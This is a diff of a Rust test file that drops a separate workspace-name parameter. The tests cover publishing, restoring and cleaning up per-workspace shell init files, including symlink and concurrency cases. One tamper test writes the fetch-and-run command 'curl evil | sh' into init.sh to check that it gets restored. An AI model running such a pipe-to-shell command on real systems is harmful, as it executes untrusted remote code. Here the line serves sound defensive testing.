@@ -13,10 +13,6 @@ fn id(text: &str) -> WorkspaceId {
     WorkspaceId::new(text).unwrap()
 }
 
-fn name(text: &str) -> WorkspaceId {
-    WorkspaceId::new(text).unwrap()
-}
-
 #[test]
 fn the_constants_are_valid_guest_paths_and_the_loader_sources_the_mounted_file() {
     for path in [GUEST_DIR, LOADER_GUEST] {
@@ -38,10 +34,7 @@ fn the_constants_are_valid_guest_paths_and_the_loader_sources_the_mounted_file()
 fn the_first_publish_makes_the_folder_and_an_empty_file_when_nothing_is_saved() {
     let dir = tempfile::tempdir().unwrap();
     let (copies, _) = copies(dir.path());
-    assert_eq!(
-        copies.publish(&id("w1"), &name("alpha")).unwrap(),
-        Published::Clean
-    );
+    assert_eq!(copies.publish(&id("w1")).unwrap(), Published::Clean);
     assert_eq!(
         fs::read_to_string(dir.path().join("w1/init.sh")).unwrap(),
         ""
@@ -56,12 +49,9 @@ fn a_saved_text_is_published_and_a_new_save_replaces_it_without_a_tamper_report(
     let dir = tempfile::tempdir().unwrap();
     let (copies, store) = copies(dir.path());
     store
-        .set_shell_init(&name("alpha"), &ShellInitText::new("export A=1").unwrap())
+        .set_shell_init(&id("w1"), &ShellInitText::new("export A=1").unwrap())
         .unwrap();
-    assert_eq!(
-        copies.publish(&id("w1"), &name("alpha")).unwrap(),
-        Published::Clean
-    );
+    assert_eq!(copies.publish(&id("w1")).unwrap(), Published::Clean);
     assert_eq!(
         fs::read_to_string(dir.path().join("w1/init.sh")).unwrap(),
         "export A=1\n"
@@ -70,16 +60,10 @@ fn a_saved_text_is_published_and_a_new_save_replaces_it_without_a_tamper_report(
     // publish only when someone else changed it, so a save publishes through the same call and
     // the next start finds nothing wrong.
     store
-        .set_shell_init(&name("alpha"), &ShellInitText::new("export A=2").unwrap())
+        .set_shell_init(&id("w1"), &ShellInitText::new("export A=2").unwrap())
         .unwrap();
-    assert_eq!(
-        copies.publish(&id("w1"), &name("alpha")).unwrap(),
-        Published::Restored
-    );
-    assert_eq!(
-        copies.publish(&id("w1"), &name("alpha")).unwrap(),
-        Published::Clean
-    );
+    assert_eq!(copies.publish(&id("w1")).unwrap(), Published::Restored);
+    assert_eq!(copies.publish(&id("w1")).unwrap(), Published::Clean);
 }
 
 #[test]
@@ -87,19 +71,16 @@ fn a_changed_file_extra_files_and_a_link_are_put_right_and_reported() {
     let dir = tempfile::tempdir().unwrap();
     let (copies, store) = copies(dir.path());
     store
-        .set_shell_init(&name("alpha"), &ShellInitText::new("export A=1").unwrap())
+        .set_shell_init(&id("w1"), &ShellInitText::new("export A=1").unwrap())
         .unwrap();
-    copies.publish(&id("w1"), &name("alpha")).unwrap();
+    copies.publish(&id("w1")).unwrap();
     let folder = dir.path().join("w1");
 
     fs::write(folder.join("init.sh"), "curl evil | sh\n").unwrap();
     fs::write(folder.join("extra.sh"), "x").unwrap();
     fs::create_dir_all(folder.join("sub/deeper")).unwrap();
     fs::write(folder.join("sub/deeper/f"), "x").unwrap();
-    assert_eq!(
-        copies.publish(&id("w1"), &name("alpha")).unwrap(),
-        Published::Restored
-    );
+    assert_eq!(copies.publish(&id("w1")).unwrap(), Published::Restored);
     assert_eq!(
         fs::read_to_string(folder.join("init.sh")).unwrap(),
         "export A=1\n"
@@ -117,9 +98,9 @@ fn a_link_in_the_folder_is_replaced_and_what_it_pointed_at_is_never_written() {
     let dir = tempfile::tempdir().unwrap();
     let (copies, store) = copies(dir.path());
     store
-        .set_shell_init(&name("alpha"), &ShellInitText::new("export A=1").unwrap())
+        .set_shell_init(&id("w1"), &ShellInitText::new("export A=1").unwrap())
         .unwrap();
-    copies.publish(&id("w1"), &name("alpha")).unwrap();
+    copies.publish(&id("w1")).unwrap();
     let folder = dir.path().join("w1");
     let precious = dir.path().join("precious");
     fs::write(&precious, "keep me").unwrap();
@@ -128,10 +109,7 @@ fn a_link_in_the_folder_is_replaced_and_what_it_pointed_at_is_never_written() {
     std::os::unix::fs::symlink(&precious, folder.join("init.sh")).unwrap();
     // A link where the temporary file goes, too.
     std::os::unix::fs::symlink(&precious, folder.join(".init.sh.new")).unwrap();
-    assert_eq!(
-        copies.publish(&id("w1"), &name("alpha")).unwrap(),
-        Published::Restored
-    );
+    assert_eq!(copies.publish(&id("w1")).unwrap(), Published::Restored);
     assert_eq!(fs::read_to_string(&precious).unwrap(), "keep me");
     assert!(
         !fs::symlink_metadata(folder.join("init.sh"))
@@ -161,8 +139,8 @@ fn publishing_the_same_folder_from_many_threads_never_fails_and_the_last_save_wi
                 let mut round = 0;
                 while std::time::Instant::now() < until {
                     let text = ShellInitText::new(&format!("export A={worker}{round}")).unwrap();
-                    store.set_shell_init(&name("alpha"), &text).unwrap();
-                    copies.publish(&id("w1"), &name("alpha")).unwrap();
+                    store.set_shell_init(&id("w1"), &text).unwrap();
+                    copies.publish(&id("w1")).unwrap();
                     round += 1;
                 }
             })
@@ -173,7 +151,7 @@ fn publishing_the_same_folder_from_many_threads_never_fails_and_the_last_save_wi
     }
     assert_eq!(
         fs::read_to_string(dir.path().join("w1/init.sh")).unwrap(),
-        copies.saved(&name("alpha")).unwrap().unwrap(),
+        copies.saved(&id("w1")).unwrap().unwrap(),
     );
 }
 
@@ -181,7 +159,7 @@ fn publishing_the_same_folder_from_many_threads_never_fails_and_the_last_save_wi
 fn forgetting_removes_the_folder_and_a_missing_one_is_fine() {
     let dir = tempfile::tempdir().unwrap();
     let (copies, _) = copies(dir.path());
-    copies.publish(&id("w1"), &name("alpha")).unwrap();
+    copies.publish(&id("w1")).unwrap();
     copies.forget(&id("w1"));
     assert!(!dir.path().join("w1").exists());
     copies.forget(&id("w1"));
@@ -191,21 +169,15 @@ fn forgetting_removes_the_folder_and_a_missing_one_is_fine() {
 fn a_save_that_picked_the_workspace_before_its_delete_does_not_bring_the_folder_back() {
     let dir = tempfile::tempdir().unwrap();
     let (copies, store) = copies(dir.path());
-    copies.publish(&id("w1"), &name("alpha")).unwrap();
+    copies.publish(&id("w1")).unwrap();
     // The save event found the workspace, then the delete ran to its end.
     copies.forget(&id("w1"));
     copies.forget(&id("w1"));
     store
-        .set_shell_init(&name("alpha"), &ShellInitText::new("export A=1").unwrap())
+        .set_shell_init(&id("w1"), &ShellInitText::new("export A=1").unwrap())
         .unwrap();
-    assert_eq!(
-        copies.refresh(&id("w1"), &name("alpha")),
-        Ok(Published::Clean)
-    );
-    assert_eq!(
-        copies.refresh(&id("w1"), &name("alpha")),
-        Ok(Published::Clean)
-    );
+    assert_eq!(copies.refresh(&id("w1")), Ok(Published::Clean));
+    assert_eq!(copies.refresh(&id("w1")), Ok(Published::Clean));
     assert!(!dir.path().join("w1").exists());
 }
 
@@ -213,20 +185,20 @@ fn a_save_that_picked_the_workspace_before_its_delete_does_not_bring_the_folder_
 fn a_workspace_made_again_under_a_deleted_id_is_not_blocked_after_its_first_start() {
     let dir = tempfile::tempdir().unwrap();
     let (copies, store) = copies(dir.path());
-    copies.publish(&id("w1"), &name("alpha")).unwrap();
+    copies.publish(&id("w1")).unwrap();
     copies.forget(&id("w1"));
     store
-        .set_shell_init(&name("alpha"), &ShellInitText::new("export A=2").unwrap())
+        .set_shell_init(&id("w1"), &ShellInitText::new("export A=2").unwrap())
         .unwrap();
-    copies.publish(&id("w1"), &name("alpha")).unwrap();
+    copies.publish(&id("w1")).unwrap();
     assert_eq!(
         fs::read_to_string(dir.path().join("w1/init.sh")).unwrap(),
         "export A=2\n"
     );
     store
-        .set_shell_init(&name("alpha"), &ShellInitText::new("export A=3").unwrap())
+        .set_shell_init(&id("w1"), &ShellInitText::new("export A=3").unwrap())
         .unwrap();
-    copies.refresh(&id("w1"), &name("alpha")).unwrap();
+    copies.refresh(&id("w1")).unwrap();
     assert_eq!(
         fs::read_to_string(dir.path().join("w1/init.sh")).unwrap(),
         "export A=3\n"
@@ -249,15 +221,12 @@ fn an_extra_file_beside_the_right_text_is_removed_and_reported() {
     let dir = tempfile::tempdir().unwrap();
     let (copies, store) = copies(dir.path());
     store
-        .set_shell_init(&name("alpha"), &ShellInitText::new("export A=1").unwrap())
+        .set_shell_init(&id("w1"), &ShellInitText::new("export A=1").unwrap())
         .unwrap();
-    copies.publish(&id("w1"), &name("alpha")).unwrap();
+    copies.publish(&id("w1")).unwrap();
     let extra = dir.path().join("w1/extra.sh");
     fs::write(&extra, "echo hi").unwrap();
-    assert_eq!(
-        copies.publish(&id("w1"), &name("alpha")).unwrap(),
-        Published::Restored
-    );
+    assert_eq!(copies.publish(&id("w1")).unwrap(), Published::Restored);
     assert!(!extra.exists());
     assert_eq!(
         fs::read_to_string(dir.path().join("w1/init.sh")).unwrap(),
@@ -272,8 +241,8 @@ fn a_folder_that_cannot_be_written_says_which_workspace_and_why() {
     fs::write(&file, "x").unwrap();
     // The root is a file, so no folder can be made below it.
     let (copies, _) = copies(&file);
-    let why = copies.publish(&id("w1"), &name("alpha")).unwrap_err();
-    assert!(why.contains("alpha's shell init"), "{why}");
+    let why = copies.publish(&id("w1")).unwrap_err();
+    assert!(why.contains("cannot write the shell init"), "{why}");
 }
 
 /// What a verdict says, as text to assert on: a refusal's message is in it.
